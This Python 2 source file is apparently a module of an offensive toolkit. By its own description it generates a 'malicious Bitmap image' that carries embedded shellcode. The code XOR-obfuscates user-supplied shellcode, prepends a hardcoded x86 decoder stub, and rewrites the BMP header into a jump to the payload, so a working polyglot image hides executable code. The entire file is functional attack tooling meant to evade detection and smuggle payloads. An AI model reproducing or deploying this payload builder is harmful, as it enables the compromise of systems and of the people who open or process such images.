from module import ModuleObject
import struct
import random
import time
import os
import re

class GenModule(ModuleObject):
    
    def __init__(self, ui):
        ModuleObject.__init__(self)
        self.ui = ui
        self.vars = {}
        self.vars["shellcode"] = ["", "Shellcode payload using \\x41\\x41 format"]
        self.vars["shellcode-path"] = ["", "Path to a raw shellcode file"]
        self.vars["source"] = ["sample/default.bmp", "Image source file path"]
        self.vars["output"] = ["output/output-%d.bmp" % time.time(), "Output file path"]
        self.vars["debug"] = ["false", "Show debug output. More verbose"]
        self.description = "Module to generate malicious Bitmap image with embedded obfuscation shellcode"
        self.module_name = "generate"
        self.image = {}
        self.decoder = "\xeb\x44\x58\x68[RAND1]\x31\xc9\x89\xcb\x6a\x04\x5a\x68[RAND2]\xff\x30\x59\x0f\xc9\x43\x31\xd9\x81\xf9[MAGIC]\x68[RAND3]\x75\xea\x0f\xcb\xb9[SIZE/4]\x01\xd0\x31\x18\x68[RAND4]\xe2\xf4\x2d[SIZE]\xff\xe0\xe8\xb7\xff\xff\xff"
    
    def is_debug(self):
        if self.vars["debug"][0].lower() == "true":
            return True
        return False
    
    def run_action(self):
        data = self.get_file_data()
        if data:
            header, data = self.parse_image(data)
            self.image["header"] =  header
            self.image["data"] = data
            self.image["width"] = header[18:22]
            self.image["height"] = header[22:26]
                        
            width = struct.unpack("<i", self.image["width"])[0]
            height = struct.unpack("<i", self.image["height"])[0]
            self.ui.print_msg("Image size is %d x %d" % (width, height))
            shellcode = ""
            if not self.vars["shellcode-path"][0] == "":
                try:
                    shellcode = self.gen_shellcode("\\x" + "\\x".join(re.findall("..", open(self.vars["shellcode-path"][0], "rb").read().encode("hex"))))
                except:
                    self.ui.print_error("shellcode-path not found")
            else:
                shellcode = self.gen_shellcode(self.vars["shellcode"][0])
            
            if shellcode:
                new_header = self.edit_bmp_header(len(self.image["header"]) + len(self.image["data"]), len(shellcode))
                self.image["header"] = new_header + self.image["header"][7:]
                self.image["data"] = self.image["data"][:(len(shellcode)) * -1] + shellcode
                self.image["header"] = self.adjust_height(self.image["header"], self.image["height"])
                self.save_image(self.image["header"] + self.image["data"], self.vars["output"][0])
        
    def get_file_data(self):
        data = ""
        path = os.getcwd()
        if os.path.exists(self.vars["source"][0]):
            data = open(self.vars["source"][0], "rb").read()
        elif os.path.exists(path + "/" + self.vars["source"][0]):
            data = open(path + "/" + self.vars["source"][0], "rb").read()
        
        if data == "":
            self.ui.print_error("%s not found" % self.vars["source"][0])
            return False
        return data
    
    def parse_image(self, data):
        header = data[:26]
        data = data[(len(data) - 26) * -1:]
        return header,data
    
    def gen_shellcode(self, shellcode):
        shellcode = shellcode.replace("\r", "").replace("\n", "")
        try:
            key = self.gen_key()
            self.ui.print_msg("Generating obfuscation key 0x%s" % key.encode("hex"))
            shellcode = self.pad_shellcode(shellcode)
            magic = self.gen_magic()
            self.ui.print_msg("Generating magic bytes %s" % hex(magic))
            shellcode = hex(magic)[2:10].decode("hex") + shellcode
            shellcode = self.xor_payload(shellcode, key)
            size = len(shellcode)
            shellcode = self.set_decoder(hex(magic)[2:10].decode("hex"), (size - 4)) + shellcode
            for i in range(1, 5):
                shellcode = shellcode.replace("[RAND" + str(i) + "]", self.gen_pop(hex(self.gen_magic())[2:10].decode("hex")))
            self.ui.print_msg("Final shellcode length is %s (%d) bytes" % (hex(len(shellcode)), len(shellcode)))
            if self.is_debug():
                print
            return shellcode
        except:
            self.ui.print_error("Something when wrong during the obfuscation. Wrong shellcode format?")
            return False
            
    def gen_key(self):
        xor_key = random.randrange(0x11111111, 0x55555555)
        if not hex(xor_key).find("00") == -1:
            self.gen_key()
        return hex(xor_key)[2:10].decode("hex")
    
    def gen_magic(self):
        return random.randrange(0x11111111, 0xffffffff)
    
    def pad_shellcode(self, shellcode):
        shellcode = shellcode.replace("\\x", "").decode("hex")
        padding = (len(shellcode)) % 4
        
        self.ui.print_msg("Shellcode size %s (%d) bytes" % (hex(len(shellcode)), len(shellcode)))
        if not padding == 0:
            self.ui.print_msg("Adding %d bytes of padding" % (4 - padding))
        shellcode = shellcode + "\x90" * (4 - padding)
        return shellcode
    
    def xor_payload(self, shellcode, key):
        # j is starting at position 1 instead of 0 (bswap)
        final = ""
        j = 0
        for i in range(0, len(shellcode)):
            j += 1
            if j == 4:
                j = 0
            byte = hex(ord(shellcode[i]) ^ ord(key[j]))[2:]
            if len(byte) < 2:
                byte = "0" + byte
            final += byte.decode("hex")
        
        return final

    def set_decoder(self, magic, size):
        size4 = ("0" * (8 - len(hex(size / 4)[2:])) + hex(size / 4)[2:]).decode("hex")[::-1]
        size = ("0" * (8 - len(hex(size - 4)[2:])) + hex(size - 4)[2:]).decode("hex")[::-1]
        return self.decoder.replace("[MAGIC]", magic[::-1]).replace("[SIZE/4]", size4).replace("[SIZE]", size)
    
    def gen_pop(self, data):
        pops = ["\x5f", "\x5e"]
        return data + pops[random.randint(0, len(pops) - 1)]
    
    def edit_bmp_header(self, size, shellcode_size):
        jmp = hex(size - shellcode_size - 7)[2:]
        jmp = "0" * (8 - len(jmp)) + jmp
        jmp = jmp.decode("hex")[::-1]
        bmp_header = "BM\xe9" + jmp
        self.ui.print_msg("New BMP header set to 0x%s" % bmp_header.encode("hex"))
        return bmp_header
    
    def adjust_height(self, header, current):
        size = struct.unpack("<i", current)[0] - 5
        size = ("0" * (8 - len(hex(size)[2:])) + hex(size)[2:]).decode("hex")[::-1]
        self.ui.print_msg("New height is 0x%s (%d)" % (size.encode("hex"), struct.unpack("<i", size)[0]))
        header = header[:-4] + size
        return header
    
    def save_image(self, data, path):
        if not path[:1] == "/":
            path = os.getcwd() + "/" + path
        try:    
            open(path, "wb").write(data)
            self.ui.print_msg("Successfully save the image. (%s)" % path)
        except:
            self.ui.print_error("Failed to save the image. (%s)" % path)       
